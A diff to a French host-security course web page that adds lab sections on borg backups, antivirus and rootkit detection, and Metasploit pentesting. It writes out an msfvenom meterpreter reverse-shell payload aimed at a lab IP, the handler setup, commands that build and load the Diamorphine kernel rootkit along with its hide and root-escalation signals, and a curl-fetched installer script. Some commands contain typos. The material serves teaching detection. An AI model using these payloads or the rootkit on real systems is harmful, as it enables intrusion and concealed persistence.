@@ -87,12 +87,17 @@
                     <li><a href="#backup_concepts">Backup : Concepts</a></li>
                     <li><a href="#backup_implementation_type">Backup : Implémentation type</a></li>
                     <li><a href="#backup_exemple_implementation_alternative">Backup : Exemple d'implémentation alternative</a></li>
+                    <li><a href="#creation_procedure_backup_mode_push_protege_suppression">Création d'une procédure de backup en mode push, protégé contre la suppression</a></li>
+                    <li><a href="#reference_mecanisme_permettant_implementer_cle_append-only">Référence pour mécanisme permettant d'implémenter une clé append-only.</a></li>
                     <li><a href="#reseau_fw_segmentation_detection_prevention_intrusion_environnements_de_travail">Réseau : Pare-feu et segmentation, Détection &amp; prévention d'intrusion : Environnements de travail</a></li>
                     <li><a href="#fw_segmentation_concepts_motivation">Pare-feu et segmentation : Concepts et motivation</a></li>
                     <li><a href="#fw_segmentation_implementation_type">Pare-feu et segmentation : Implémentation type</a></li>
                     <li><a href="#detection_prevention_intrusion_concepts">Détection/prévention d'intrusion : Concepts</a></li>
                     <li><a href="#detection_prevention_intrusion_implementation_type">Détection/prévention d'intrusion : Implémentation type</a></li>
                     <li><a href="#detection_prevention_intrusion_forces_faiblesses">Détection/prévention d'intrusion : Forces et faiblesses</a></li>
+                    <li><a href="#scanning_virus_rootkits_envitonnements_de_travail">Scanning : virus et rootkits : environnements de travail</a></li>
+                    <li><a href="#scanning_detection_virus_rootkit">Scanning : Détection de virus et rootkit</a></li>
+                    <li><a href="#scanning_demo_rootkit">Scanning : Démo rootkit</a></li>
                     <li><a href="#evaluation_instructions">Évaluation - instructions</a></li>
                 </ol>
             </nav>
@@ -5973,6 +5978,61 @@ sudo lvremove -y /dev/origin/origin-data-snapshot</code></pre>
                     <img src="../images/configuration_service.PNG" alt="">
                 </article>
                 <article>
+                    <h2 id="creation_procedure_backup_mode_push_protege_suppression">Création d'une procédure de backup en mode push, protégé contre la suppression.</h2>
+                    <p>Créez, implémentez, et documentez une procédure (copies d'écran) de backup.</p>
+                    <p>Voici le Vagrantfile de la VM nommée "<span class="em">backup-exercice</span>" :</p>
+<pre><code># coding: utf-8
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/jammy64"
+
+  config.vm.provision "shell", inline: &lt;&lt;-SHELL
+#!/bin/bash
+
+  # principe général: https://docs.borgbase.com/setup/borg/cli
+
+  set -euo pipefail
+
+  # Mise à jour du fuseau horaire - important pour bien interpréter les logs
+  timedatectl set-timezone Europe/Brussels
+
+  # Chargement des packages, en mode non-interactif(!), python3-pip nécessaire pour pip3
+  DEBIAN_FRONTEND=noninteractive apt-get update
+  DEBIAN_FRONTEND=noninteractive apt-get install -y borgbackup python3 python3-pip
+
+  # installation de borgmatic en tant que vagrant
+
+  sudo -u vagrant pip3 install borgmatic
+
+  # création d'un fichier
+  echo "hello" | sudo -u vagrant tee -a /home/vagrant/hello.txt
+
+  sudo -u vagrant mkdir -p /home/vagrant/.config/borgmatic
+  echo -e "
+source_directories:
+    - /home/vagrant
+repositories:
+    - path: ssh://METTREVOTREREPOSITORYICI.repo.borgbase.com/./repo
+      label: backupserveretudiants
+encryption_passphrase: "dummy"
+keep_hourly: 24
+keep_daily: 7" | sudo -u vagrant tee -a /home/vagrant/.config/borgmatic/config.yaml &gt; /dev/null
+
+  sudo -u vagrant chmod go-rwx /home/vagrant/.config/borgmatic/config.yaml
+
+  sudo -u vagrant ssh-keygen -o -a 100 -t ed25519 -f /home/vagrant/.ssh/id_ed25519 -q -N ''
+
+  # visualisation clé publique pour incorporation dans borgbase
+
+  cat /home/vagrant/.ssh/id_ed25519.pub
+
+  SHELL
+end</code></pre>
+                </article>
+                <article>
+                    <h2 id="reference_mecanisme_permettant_implementer_cle_append-only">Référence pour mécanisme permettant d'implémenter une clé append-only :</h2>
+                    <p>Voir "man authorized_keys" dans un serveur implémentation sshd.</p>
+                </article>
+                <article>
                     <h2 id="reseau_fw_segmentation_detection_prevention_intrusion_environnements_de_travail">Réseau : Pare-feu et segmentation, Détection &amp; prévention d'intrusion : Environnements de travail :</h2>
                     <ol>
                         <li>
@@ -6555,6 +6615,386 @@ sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
                             </ul>
                         </li>
                     </ul>
+                </article>
+                <article>
+                    <h2 id="scanning_virus_rootkits_envitonnements_de_travail">Scanning : virus et rootkits : environnements de travail :</h2>
+                    <h3>Box Vagrant Scanning :</h3>
+                    <ol>
+                        <li>
+                            <p>scanning :</p>
+                            <ul>
+                                <li>
+                                    <p>Démo protection virus et rootkit.</p>
+                                </li>
+                            </ul>
+                            <p>À télécharger et démarrer comme d'habitude. Attention, il se peut que votre anti-virus rejète le fichier eicarcom2.zip - ce qui serait plutôt une bonne chose :-) car sa "signature" fait penser à un virus. Au besoin, utliser la boîte "scanning-sanitized".</p>
+                            <p>Votre poste hôte gagne à être équipé de Metasploit Framework.</p>
+                            <p>Voici le Vagrantfile de cette VM :</p>
+<pre><code># coding: utf-8
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/jammy64"
+  config.vm.box_version = "20240115.0.0" #diamorphine (https://github.com/m0nad/Diamorphine) est assez sensible aux versions
+  config.vm.network "private_network", ip: '172.28.128.21'
+  config.vm.provision "file", source: "./shell", destination: "/home/vagrant/shell"
+  config.vm.provision "file", source: "./shell2", destination: "/home/vagrant/shell2"
+  config.vm.provision "file", source: "./eicarcom2.zip", destination: "/home/vagrant/eicarcom2.zip"
+  config.vm.provider "virtualbox" do |v|
+      v.name = "scanning"
+      v.memory = 2048
+  end
+
+  config.vm.provision "shell", inline: &lt;&lt;-SHELL
+
+#!/bin/bash
+  set -euo pipefail
+
+  # Chargement des packages, en mode non-interactif(!)
+  DEBIAN_FRONTEND=noninteractive apt-get update
+  DEBIAN_FRONTEND=noninteractive apt-get install -y clamav clamav-daemon chkrootkit
+
+  # Continuation, fix pour Diamorphine qui ne trouve pas vmlinux au moment de la compilation
+  # Voir https://askubuntu.com/questions/1348250/skipping-btf-generation-xxx-due-to-unavailability-of-vmlinux-on-ubuntu-21-04
+  DEBIAN_FRONTEND=noninteractive apt-get install -y pahole
+  cp /sys/kernel/btf/vmlinux /usr/lib/modules/"$(uname -r)"/build/ 
+
+  # Mise à jour de la base de donnée des virus
+  systemctl stop clamav-freshclam
+  freshclam
+  systemctl enable clamav-freshclam --now
+
+  # rendre les payloads exécutables
+  chmod +x shell
+  chmod +x shell2
+
+  SHELL
+end</code></pre>
+                            <p>Voici le Vagrantfile de la VM nommée "<span class="em">scanning-sanitized</span>" :</p>
+<pre><code># coding: utf-8
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/jammy64"
+  config.vm.box_version = "20240115.0.0" #diamorphine (https://github.com/m0nad/Diamorphine) est assez sensible aux versions
+  config.vm.network "private_network", ip: '172.28.128.21'
+  #config.vm.provision "file", source: "./shell", destination: "/home/vagrant/shell"
+  #config.vm.provision "file", source: "./shell2", destination: "/home/vagrant/shell2"
+  #config.vm.provision "file", source: "./eicarcom2.zip", destination: "/home/vagrant/eicarcom2.zip"
+  config.vm.provider "virtualbox" do |v|
+      v.name = "scanning-sanitized"
+      v.memory = 2048
+  end
+
+  config.vm.provision "shell", inline: &lt;&lt;-SHELL
+
+#!/bin/bash
+  set -euo pipefail
+
+  # Chargement des packages, en mode non-interactif(!)
+  DEBIAN_FRONTEND=noninteractive apt-get update
+  DEBIAN_FRONTEND=noninteractive apt-get install -y clamav clamav-daemon chkrootkit
+
+  # Continuation, fix pour Diamorphine qui ne trouve pas vmlinux au moment de la compilation
+  # Voir https://askubuntu.com/questions/1348250/skipping-btf-generation-xxx-due-to-unavailability-of-vmlinux-on-ubuntu-21-04
+  DEBIAN_FRONTEND=noninteractive apt-get install -y pahole
+  cp /sys/kernel/btf/vmlinux /usr/lib/modules/"$(uname -r)"/build/ 
+
+  # Mise à jour de la base de donnée des virus
+  systemctl stop clamav-freshclam
+  freshclam
+  systemctl enable clamav-freshclam --now
+
+  # rendre les payloads exécutables
+  #chmod +x shell
+  #chmod +x shell2
+
+  SHELL
+end</code></pre>
+                        </li>
+                        <li>
+                            <p>Metasploit sur machine hôte :</p>
+                            <ul>
+                                <li>
+                                    <p>Test "payload".</p>
+                                </li>
+                            </ul>
+                        </li>
+                    </ol>
+                </article>
+                <article>
+                    <h2 id="scanning_detection_virus_rootkit">Scanning : Détection de virus et rootkit :</h2>
+                    <h3>Détection de virus :</h3>
+                    <h4>Exemple Clamav - mise à jour des signatures :</h4>
+                    <img src="../images/detection_virus_1.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>sudo systemctl stop clamv-freshclam</code></pre>
+<pre><code>sudo freshclam</code></pre>
+                    <h4>Création d'un payload de type "reverse shell" :</h4>
+                    <p><a href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/" target="_blank">https://www.hackingarticles.in/msfvenom-tutorials-beginners/</a></p>
+                    <img src="../images/detection_virus_2.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>cd ~/Downloads</code></pre>
+<pre><code>msfvenom -p linux/x86/meterpreter/reververse_tcp lhost=172.28.128.1 lport=4444 -f elf &gt; /home/galagao/shell2</code></pre>
+<pre><code>cp ~/shell2 /home/galago/Sync/EPHEC/host-security/vm-provisioning/hard/</code></pre>
+                    <h4>Configuration de l'écoute dans msfconsole :</h4>
+                    <img src="../images/detection_virus_3.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>use exploit/multi/handler</code></pre>
+<pre><code>set payload_linux/x86/meterpreter/reverse_tvp</code></pre>
+<pre><code>set lhost 172.28.128.1</code></pre>
+<ptr><code>set lport 4444</code></ptr>
+                    <h4>Exploitation du système :</h4>
+                    <img src="../images/detection_virus_4.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>./shell2</code></pre>
+<pre><code>run</code></pre>
+<pre><code>shell</code></pre>
+<pre><code>exit</code></pre>
+                    <h4>Scan du système :</h4>
+                    <img src="../images/detection_virus_5.PNG" alt="">
+<pre><code>clamscan ~</code></pre>
+                    <h4>Fichier test eicarcom - windows (pas 64 bits) - détecté malgré zip :</h4>
+                    <p><a href="https://www.eicar.org/download-anti-malware-testfile/" target="_blank">https://www.eicar.org/download-anti-malware-testfile/</a></p>
+                    <img src="../images/detection_virus_6.PNG" alt="">
+                    <h4>Considératons :</h4>
+                    <ul>
+                        <li>
+                            <p>Nécessite mise à jour fréquente des signatures; automatisation (!).</p>
+                        </li>
+                        <li>
+                            <p>Problématique de la fiabiité - faux positifs, faux négatifs.</p>
+                        </li>
+                        <li>
+                            <p>Idéalement placé sur proxy - mail.</p>
+                        </li>
+                        <li>
+                            <p>Faire tourner régulièrement; automatisation (!).</p>
+                        </li>
+                        <li>
+                            <p>Assez consommateur, notamment en mémoire - voir Vagrantfile.</p>
+                        </li>
+                        <li>
+                            <p>Comme toujours, une partie de solution seulement.</p>
+                        </li>
+                    </ul>
+                    <h3>Rootkits :</h3>
+                    <p>Evi Nemeth &amp; co.</p>
+                    <ul>
+                        <li>
+                            <p>Hacker cachent leur activité - persistence de l'attaque dans le temps.</p>
+                        </li>
+                        <li>
+                            <p>Rootkits = programmes &amp; modifications de commandes standards ou du kernel lui-même.</p>
+                        </li>
+                        <li>
+                            <p>But : dissimuler l'informaton.</p>
+                        </li>
+                        <li>
+                            <p>Contre-mesures :</p>
+                            <ul>
+                                <li>
+                                    <p>Host-based Intrusion Detection System (AIDE, OSSEC...) - vérifie l'intégrité de fichiers clés.</p>
+                                </li>
+                                <li>
+                                    <p>Programmes spécialisés.</p>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                    <h4>Détection de rootkit :</h4>
+                    <h5>Programme chkrootkit :</h5>
+                    <img src="../images/detection_rootkit.PNG" alt="">
+<pre><code>sudo chkrootkit</code></pre>
+                    <h4>Considérations :</h4>
+                    <ul>
+                        <li>
+                            <p>Nécessite mise à jour fréquente; automatisation (!).</p>
+                        </li>
+                        <li>
+                            <p>Problématique de la fiabilité - faux positifs, faux négatifs.</p>
+                        </li>
+                        <li>
+                            <p>Faire tourner régulièrement; automatisation (!).</p>
+                        </li>
+                        <li>
+                            <p>Comme toujours, une partie de solution seulement.</p>
+                        </li>
+                    </ul>
+                </article>
+                <article>
+                    <h2 id="scanning_demo_rootkit">Scanning : Démo rootkit :</h2>
+                    <p><a href="https://github.com/m0nad/Diamorphine" target="_blank">https://github.com/m0nad/Diamorphine</a></p>
+                    <p><a href="https://github.com/m0nad/Diamorphine/issues/20" target="_blank">https://github.com/m0nad/Diamorphine/issues/20</a></p>
+                    <p><a href="https://connect.ed-diamond.com/Linux-Pratique/lp-112/securite-d-un-systeme-gnu-linux-les-premiers-pas" target="_blank">https://connect.ed-diamond.com/Linux-Pratique/lp-112/securite-d-un-systeme-gnu-linux-les-premiers-pas</a></p>
+                    <h3>Installation sur box "hard" :</h3>
+                    <img src="../images/demo_rootkit_1.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>sudo apt install git gcc make linux-headers-$(uname -r)</code></pre>
+<pre><code>git clone https://github.com/m0nad/Diamorphine</code></pre>
+<pre><code>cd Diamorphine</code></pre>
+<pre><code>make</code></pre>
+<pre><code>sudo insmod diamorphine.ko</code></pre>
+                    <h3>Exploitation 1 :</h3>
+                    <img src="../images/demo_rootkit_2.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>lmod | grep diam</code></pre>
+<pre><code>kill -63 0</code></pre>
+<pre><code>lsmod @grep diam</code></pre>
+<pre><code>ps aux | grep sshd</code></pre>
+<pre><code>kill -31 789</code></pre>
+<pre><code>ps aux | grep sshd</code></pre>
+                    <h3>Exploitation 2 :</h3>
+                    <img src="../images/demo_rootkit_3.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>mkdir diamorphine_secret_jean</code></pre>
+<pre><code>ls</code></pre>
+<pre><code>cd diamorphine_secret_jean</code></pre>
+                    <h3>Exploitation 3 :</h3>
+                    <img src="../images/demo_rootkit_4.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>id</code></pre>
+<pre><code>kill -64 0</code></pre>
+<pre><code>id</code></pre>
+                    <h3>Détection :</h3>
+                    <img src="../images/demo_rootkit_5.PNG" alt="">
+<pre><code>sudo chkrootkit -q</code></pre>
+                </article>
+                <article>
+                    <h2 id="pratique_detection_pentesting_environnements_de_travail">Pratique détection et pentesting : environnements de travail :</h2>
+                    <h3>Box Vagrant Praique Detection :</h3>
+                    <p>Le but est de mettre en pratique les détections vues au cours Réseau et Scanning et l'exemple étendu de pentesting &amp; de détection (voir plus tard). Si vous utilisez la machine virtuelle pentest ci-dessous, penser à spécifier que lhost a l'adresse 172.28.128.222 !</p>
+                    <p>Les machines virtuelles sont :</p>
+                    <ol>
+                        <li>
+                            <p>metasploitable3-ub1404-2 :</p>
+                            <ul>
+                                <li>
+                                    <p>Machine cible intentionnellement vulnérable.</p>
+                                </li>
+                                <li>
+                                    <p>Snort installé.</p>
+                                </li>
+                                <li>
+                                    <p>Version légèrement améliorée de metasploitable; le nom de la machine virtuelle posait problèmes pour certaines versions de VirtualBox.</p>
+                                </li>
+                            </ul>
+                            <p>Voici le Vagrantfile de cette VM :</p>
+<pre><code># coding: utf-8
+Vagrant.configure("2") do |config|
+  config.vm.synced_folder '.', '/vagrant', disabled: true
+  config.vm.define "ub1404" do |ub1404|
+    ub1404.vm.box = "rapid7/metasploitable3-ub1404"
+    ub1404.vm.hostname = "metasploitable3-ub1404"
+    config.ssh.username = 'vagrant'
+    config.ssh.password = 'vagrant'
+
+    ub1404.vm.network "private_network", ip: '172.28.128.3'
+
+    ub1404.vm.provider "virtualbox" do |v|
+      # v.name = "M-ub1404" Semble créer des problèmes avec certaines versions de VirtualBox
+      v.memory = 2048
+    end
+
+    config.vm.provision "shell", inline: &lt;&lt;-SHELL
+#!/bin/bash
+
+    set -euo pipefail
+
+    # Chargement des packages, en mode non-interactif(!)
+    DEBIAN_FRONTEND=noninteractive apt-get install -y snort
+
+    # Nettoyage des directories snort, ils seront remplacés via sftp
+    rm -rf /etc/snort
+    mkdir /etc/snort
+    mkdir /etc/snort/rules
+
+  SHELL
+  end
+end</code></pre>
+                        </li>
+                        <li>
+                            <p>scanning-sanitized :</p>
+                            <ul>
+                                <li>
+                                    <p>Anti-virus installé, mais pas de virus pour faciliter l'installation.</p>
+                                </li>
+                                <li>
+                                    <p>Version de scanning sans les fichiers posant des problèmes aux anti-virus.</p>
+                                </li>
+                            </ul>
+                        </li>
+                        <li>
+                            <p>pentest :</p>
+                            <ul>
+                                <li>
+                                    <p>Metasploitable Framework et Nmap installés, c'est-à-dire pas besoin d'installer ces outils sur la machine hôte.</p>
+                                </li>
+                                <li>
+                                    <p>! adresse 172.28.128.222.</p>
+                                </li>
+                            </ul>
+                            <p>Voici le Vagrantfile de cette VM :</p>
+<pre><code># coding: utf-8
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+  config.vm.box = "ubuntu/jammy64"
+
+  # Create a private network. In VirtualBox, this is a Host-Only network
+  config.vm.network "private_network", ip: "172.28.128.222"
+
+  # VirtualBox specific settings
+  config.vm.provider "virtualbox" do |vb|
+    # Hide the VirtualBox GUI when booting the machine
+    vb.gui = false
+
+    # Customize the amount of memory on the VM:
+    vb.memory = "4096"
+  end
+
+  # Provision the machine with a shell script
+  config.vm.provision "shell", inline: &lt;&lt;-SHELL
+
+#!/bin/bash
+  # installation metasploit framework
+  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+    # Chargement des packages, en mode non-interactif(!)
+    DEBIAN_FRONTEND=noninteractive apt-get update
+    DEBIAN_FRONTEND=noninteractive apt-get install -y nmap
+
+  SHELL
+
+end</code></pre>
+                        </li>
+                    </ol>
+                </article>
+                <article>
+                    <h2 id="detection_pentesting_exemple_etendu">Détection et pentesting : Exemple étendu :</h2>
+                    <h3>Accès initial :</h3>
+                    <h4>Configuration</h4>
+                    <img src="../images/exemple_etendu_1.PNG" alt="">
+<pre><code>options</code></pre>
+                    <h4>Obtention d'une session à distance :</h4>
+                    <img src="../images/exemple_etendu_2.PNG" alt="">
+<pre><code>run</code></pre>
+                    <h3>Upgrade de la session :</h3>
+                    <h4>Création d'une session meterpreter :</h4>
+                    <img src="../images/exemple_etendu_3.PNG" alt="">
+<pre><code>sessions</code></pre>
+                    <h3>Recherche de vulnérabilités locales :</h3>
+                    <h4>Configuration et recherche :</h4>
+                    <img src="../images/exemple_etendu_4.PNG" alt="">
+<pre><code>options</code></pre>
+                    <p><a href="" target="_blank"></a></p>
+                    <h3>Exécution de l'élévation de privilège :</h3>
+                    <h4>Configuration :</h4>
+                    <img src="../images/exemple_etendu_5.PNG" alt="">
+                    <p><a href="" target="_blank"></a></p>
+                    <h4>Obtenir des privilèges :</h4>
+                    <img src="../images/exemple_etendu_6.PNG" alt="">
+<pre><code>run</code></pre>
+                    <p><a href="" target="_blank"></a></p>
                 </article>
                 <article>
                     <h2 id="evaluation_instructions">Évaluation - instructions :</h2>
